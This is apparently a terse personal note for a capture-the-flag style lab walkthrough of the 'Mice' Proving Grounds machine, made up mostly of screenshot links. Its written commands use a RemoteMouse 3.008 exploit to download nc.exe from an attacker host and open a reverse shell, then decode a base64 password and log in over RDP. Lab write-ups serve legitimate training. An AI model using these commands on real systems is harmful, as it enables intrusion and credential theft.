![[Pasted image 20260705005043.png]]

![[Pasted image 20260705005519.png]]
![[Pasted image 20260705005609.png]]

```
python3 RemoteMouse-3.008-Exploit.py -t 192.168.62.199 -c 'powershell -c "curl http://192.168.49.62/nc.exe -o C:\Windows\Temp\nc.exe"'

```

![[Pasted image 20260705005956.png]]

```
python3 RemoteMouse-3.008-Exploit.py -t 192.168.62.199 -c 'C:\Windows\Temp\nc.exe 192.168.49.62 80 -e cmd'

```

![[Pasted image 20260705010107.png]]
![[Pasted image 20260705010219.png]]

Q29udHJvbEZyZWFrMTE

echo 'Q29udHJvbEZyZWFrMTE' | base64 -d

ControlFreak11


xfreerdp /v:192.168.62.199 /u:divine /p:ControlFreak11 /f

from preference

![[Pasted image 20260705011526.png]]

C:\Windows\System32\cmd.exe 

![[Pasted image 20260705011632.png]]
![[Pasted image 20260705011757.png]]

https://medium.com/@mu.aktepe18/mice-proving-ground-walk-through-235465dc5f1c
